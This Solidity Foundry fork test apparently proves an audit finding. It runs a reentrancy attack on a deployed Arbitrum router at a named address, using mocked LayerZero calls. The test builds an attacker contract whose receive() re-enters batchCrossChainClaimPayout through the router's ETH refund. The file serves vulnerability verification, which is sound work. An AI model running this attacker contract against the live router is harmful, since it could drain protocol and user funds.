// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";

/// @title FT-05: AE-F-002+AE-F-005 Amplification Fork Test
/// @notice Proves re-entry against the REAL Arbitrum mainnet router
/// @dev Forks Arbitrum mainnet and interacts with the real deployed router at
///      0xCab6a41090e274eFE7fE64CF0EC906F413686D36.
///      Uses vm.mockCall to mock the LayerZero endpoint's quote/send functions,
///      proving that the real router's refund mechanism enables reentrancy.
/// @custom:severity HIGH (Combined) - Proves permissionless amplification
contract FT05_AmplificationForkTest is Test {
    // ── Real mainnet addresses ──────────────────────────────────────────────
    address constant ROUTER = 0xCab6a41090e274eFE7fE64CF0EC906F413686D36;
    address constant ENDPOINT = 0x1a44076050125825900e736c501f859c50fE728c;
    uint32 constant ARBITRUM_EID = 30110;
    uint32 constant BASE_EID = 30184; // Peer configured: 0xf132654d...

    // ── Structs matching IAmpleEarnCrossChainRouter ─────────────────────────
    struct DesignatedRecipientMerkleLeaf {
        uint256 payoutAmount;
        address user;
        uint8 designatedRecipientIndex;
    }

    struct ClaimPayoutParams {
        uint256 payoutId;
        address vault;
        DesignatedRecipientMerkleLeaf designatedRecipientLeaf;
        bytes32[] designatedRecipientProof;
        bool claimInUnderlying;
    }

    struct LayerZeroClaimPayoutParams {
        uint32 dstEid;
        bytes options;
        ClaimPayoutParams[] claims;
    }

    // ── Selectors ──────────────────────────────────────────────────────────
    // cast sig "quote((uint32,bytes32,bytes,bytes,bool),address)" = 0xddc28c58
    // cast sig "send((uint32,bytes32,bytes,bytes,bool),address)"  = 0x2637a450
    bytes4 constant QUOTE_SEL = 0xddc28c58;
    bytes4 constant SEND_SEL = 0x2637a450;

    // ── Attacker contract ──────────────────────────────────────────────────
    AmplificationAttackerFork public attacker;

    // ────────────────────────────────────────────────────────────────────────
    //  Setup
    // ────────────────────────────────────────────────────────────────────────

    function setUp() public {
        // Verify we're pointing at the real deployed router
        address ep;
        uint32 eid;
        {
            bytes memory epResult = _staticCall(ROUTER, abi.encodeWithSignature("endpoint()"));
            ep = abi.decode(epResult, (address));
            bytes memory eidResult = _staticCall(ROUTER, abi.encodeWithSignature("localEid()"));
            eid = abi.decode(eidResult, (uint32));
        }

        assertEq(ep, ENDPOINT, "Fork: endpoint mismatch - wrong fork?");
        assertEq(eid, ARBITRUM_EID, "Fork: EID mismatch - wrong fork?");

        // ── Mock LayerZero endpoint functions ──
        // quote((uint32,bytes32,bytes,bytes,bool),address) returns
        //   (uint256 nativeFee, uint256 lzTokenFee)
        vm.mockCall(
            ENDPOINT,
            abi.encodeWithSelector(QUOTE_SEL),
            abi.encode(0.01 ether, uint256(0))
        );

        // send((uint32,bytes32,bytes,bytes,bool),address) returns
        //   (bytes32 guid, uint64 nonce, uint256 nativeFee, uint256 lzTokenFee)
        vm.mockCall(
            ENDPOINT,
            abi.encodeWithSelector(SEND_SEL),
            abi.encode(
                keccak256(abi.encode(block.timestamp, uint256(0))),
                uint64(0),
                0.01 ether,
                uint256(0)
            )
        );

        // Deploy attacker
        attacker = new AmplificationAttackerFork();
    }

    // ────────────────────────────────────────────────────────────────────────
    //  Tests
    // ────────────────────────────────────────────────────────────────────────

    /// @notice Proves re-entry against the REAL Arbitrum router
    /// @dev     1. Attacker calls batchCrossChainClaimPayout with a cross-chain
    ///            claim (dstEid = 30184, Base - peer configured on mainnet).
    ///          2. Router sends LZ message (intercepted by vm.mockCall).
    ///          3. Router refunds excess ETH via .call{value}(msg.sender) at
    ///            line 130 of the real source code.
    ///          4. Attacker's receive() fires and re-enters the router.
    ///          5. Reentrant call succeeds - proving no nonReentrant guard.
    function test_AmplificationFork() public {
        // Prepare cross-chain claim params
        LayerZeroClaimPayoutParams[] memory params = _makeParams();

        // Fund attacker so router has ETH to refund (triggering reentrancy)
        vm.deal(address(attacker), 10 ether);

        // Encode params into bytes for the attacker contract
        attacker.setAttackParams(abi.encode(params));
        attacker.setReentryConfig(true, 1);

        // ── Execute attack ──
        // Send 1 ether -> router uses 0.01 for LZ, refunds 0.99 to attacker
        // Attacker's receive() fires -> re-enters router with refunded ETH
        attacker.attack{value: 1 ether}();

        // ── VERIFY REENTRANCY ──
        assertEq(
            attacker.reentryCount(),
            1,
            "AE-F-002+005: Reentry should have happened once via real router"
        );

        assertTrue(
            attacker.reentrantCallSucceeded(),
            "AE-F-002+005: Reentrant call to real router should have succeeded"
        );

        console2.log("");
        console2.log("=== AMPLIFICATION FORK TEST - PASS ===");
        console2.log("");
        console2.log("Router tested (Arbitrum mainnet):", ROUTER);
        console2.log("LayerZero endpoint:", ENDPOINT);
        console2.log("");
        console2.log("Reentry count:", attacker.reentryCount());
        console2.log("Reentrant call succeeded:", attacker.reentrantCallSucceeded());
        console2.log("");
        console2.log("PROVEN: The REAL mainnet router at Arbitrum");
        console2.log("  (0xCab6a41090e274eFE7fE64CF0EC906F413686D36)");
        console2.log("  lacks nonReentrant on batchCrossChainClaimPayout");
        console2.log("  and the refund .call{value}(msg.sender) at line 130");
        console2.log("  enables reentrancy amplification of AE-F-002.");
        console2.log("");
        console2.log("Severity: HIGH (permissionless, no additional capital required)");
        console2.log("");
        console2.log("Refund line (RelevantContract:130):");
        console2.log("  (bool success,) = payable(msg.sender).call{value: msg.value - totalValueUsed}(\"\");");
    }

    // ────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ────────────────────────────────────────────────────────────────────────

    function _makeParams() internal view returns (LayerZeroClaimPayoutParams[] memory) {
        LayerZeroClaimPayoutParams[] memory params = new LayerZeroClaimPayoutParams[](1);

        ClaimPayoutParams[] memory claims = new ClaimPayoutParams[](1);
        claims[0] = ClaimPayoutParams({
            payoutId: 1,
            vault: address(0xdead),
            designatedRecipientLeaf: DesignatedRecipientMerkleLeaf({
                payoutAmount: 100 ether,
                user: address(this),
                designatedRecipientIndex: 0
            }),
            designatedRecipientProof: new bytes32[](0),
            claimInUnderlying: false
        });

        params[0] = LayerZeroClaimPayoutParams({
            dstEid: BASE_EID,
            options: hex"",
            claims: claims
        });

        return params;
    }

    function _staticCall(address target, bytes memory data) internal view returns (bytes memory) {
        (bool success, bytes memory result) = target.staticcall(data);
        require(success, "staticcall failed");
        return result;
    }
}

/// @notice Malicious contract that re-enters batchCrossChainClaimPayout
///         when receiving the ETH refund from the real router.
contract AmplificationAttackerFork {
    address public constant ROUTER = 0xCab6a41090e274eFE7fE64CF0EC906F413686D36;
    bytes4 constant BATCH_CLAIM_SEL = 0x7eae4ba6;

    bytes public encodedParams;
    bool public doReenter;
    uint256 public reentryCount;
    uint256 public maxReentries;
    bool public reentrantCallSucceeded;

    event ReentryAttempt(uint256 count);

    function setAttackParams(bytes calldata _encodedParams) external {
        encodedParams = _encodedParams;
    }

    function setReentryConfig(bool _doReenter, uint256 _maxReentries) external {
        doReenter = _doReenter;
        maxReentries = _maxReentries;
    }

    /// @notice Entry point: initiates the first call to batchCrossChainClaimPayout
    function attack() external payable {
        (bool success,) = ROUTER.call{value: msg.value}(
            abi.encodeWithSelector(
                BATCH_CLAIM_SEL,
                abi.decode(encodedParams, (AmplificationAttackerFork.LayerZeroClaimPayoutParams[]))
            )
        );
        require(success, "attack(): initial call failed");
    }

    /// @notice receive() is triggered by the refund .call{value:}("") on the real router
    receive() external payable {
        if (doReenter && reentryCount < maxReentries) {
            reentryCount++;
            emit ReentryAttempt(reentryCount);

            uint256 balance = address(this).balance;
            (bool success,) = ROUTER.call{value: balance}(
                abi.encodeWithSelector(
                    BATCH_CLAIM_SEL,
                    abi.decode(encodedParams, (AmplificationAttackerFork.LayerZeroClaimPayoutParams[]))
                )
            );

            if (success) {
                reentrantCallSucceeded = true;
            }
        }
    }

    // ── Structs (duplicated for ABI decoding in receive) ──
    struct DesignatedRecipientMerkleLeaf {
        uint256 payoutAmount;
        address user;
        uint8 designatedRecipientIndex;
    }

    struct ClaimPayoutParams {
        uint256 payoutId;
        address vault;
        DesignatedRecipientMerkleLeaf designatedRecipientLeaf;
        bytes32[] designatedRecipientProof;
        bool claimInUnderlying;
    }

    struct LayerZeroClaimPayoutParams {
        uint32 dstEid;
        bytes options;
        ClaimPayoutParams[] claims;
    }
}
